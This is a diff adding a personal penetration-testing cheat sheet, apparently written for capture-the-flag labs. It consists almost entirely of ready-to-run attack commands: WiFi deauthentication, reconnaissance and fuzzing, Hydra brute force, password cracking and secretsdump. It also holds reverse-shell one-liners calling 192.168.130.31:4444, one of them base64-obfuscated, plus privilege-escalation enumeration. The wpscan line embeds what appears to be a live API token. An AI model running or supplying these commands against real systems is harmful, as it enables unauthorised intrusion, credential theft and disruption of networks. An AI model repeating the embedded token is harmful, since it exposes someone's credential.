@@ -1,0 +1,75 @@
+WIFI:
+        --band a
+        sudo airmon-ng check kill
+        sudo airmon-ng start wlan0mon
+        sudo airodump-ng wlan0mon
+        sudo airodump-ng --bssid [MAC] -c wlan0mon
+        sudo aireplay-ng -0 0 -a [MAC_РОУТЕРА] wlan0mon
+        sudo aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30
+TOOLS:
+	Run : subfinder -d someweb.com -o subf.txt -v
+	
+	Run : echo “someweb.com” | ~/go/bin/haktrails subdomains > haksubs.txt
+
+	Run : assetfinder -subs-only someweb.com > asset.txt
+	cat subf.txt haksubs.txt asset.txt | sort -u > subdomains.txt
+	~/go/bin/httpx -l subdomains.txt -o activesubs.txt -threads 200 -status-code -follow-redirects
+        nmap -sS --open -sV -Pn -T4 -vvv <IP-адрес>
+        ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc all -c -v -u http://10.81.180.85/FUZZ 
+	feroxbuster -u https://target.com -w /usr/share/SecLists/
+        hydra -L userlist -P passlist protocol://address -vvv  
+	ffuf -request request.txt -request-proto http -w wordlist.txt:FUZZ -fr "ErrorCode=1" -c -v
+        katana -u https://10.81.185.232 -j | grep "THM"
+        binwalk -e filename
+        hashcat -m <hash type> <file storing your hash> <path to wordlist>
+        stegseek image wordlist
+        zbarimg image.png
+        java -jar /bin/stegsolve.jar
+        john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+        wpscan --url http://10.82.184.231/ -e u -P /usr/share/wordlists/rockyou.txt --api-token iOZsJVBaHaDImXmUt3UwABIudk56HsYWWIkIZWCGDEY
+        subfinder -d example.com
+        webanalyze -hosts domains1.txt  -update > technologies.txt
+        cat domains1.txt | getallurls | grep '=' >> all_parameters.txt
+        nuclei -target http://example.com
+        rpcinfo -p 10.80.140.153
+        showmount -e 10.80.140.153
+        rdesktop -u username -p password IP
+        python3 secretsdump.py -sam sam.save -system system.save LOCAL
+	python3 ~/awesome_things/scripts/knockit.py -b <IP> 1111 2222 3333 4444
+        crackmapexec smb 10.80.167.149 -u 'a' -p '' --shares 
+        smbclient //10.82.130.53/share
+
+REVERSE SHELL:
+        /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.130.31/4444 0>&1"
+        nc 192.168.130.31 4441 -e /bin/bash
+        rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.130.31 4444 > /tmp/f
+        X=$(echo "YmFzaAo=" | base64 -d); echo "L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzAuMzEvNDQ0NCAwPiYxIgo=" | base64 -d | $X
+
+REVERSE SHELL UPGRADE:
+        stty raw -echo && fg
+        stty rows $x columns $y
+        rlwrap nc -lvnp 4444
+        python3 -c 'import pty; pty.spawn("/bin/bash")'
+        export SHELL=bash; export TERM=xterm-256color; bash -i
+
+PRIVILEGE ESCALATION:
+        id
+        cat /etc/crontab
+        find / -perm -4000 2>/dev/null
+        sudo -l
+        (env || set) 2>/dev/null
+        ls -la /etc/cron.*
+        ss -tulpn
+        find / -type f -group adm 2>/dev/null
+        ps aux
+        systemctl | grep running
+	service --status-all | grep '+'
+	grep -ir "password"
+        Get-WmiObject -Class Win32_Product
+
+OTHER:
+        ssh-keygen -t rsa -b 4096 -C "user"
+        sudo tcpdump -i tun0 icmp
+        nc -lvnp 4444
+        mysql -u root -p
+        /usr/share/exploitdb/exploits/php/webapps/51536.py
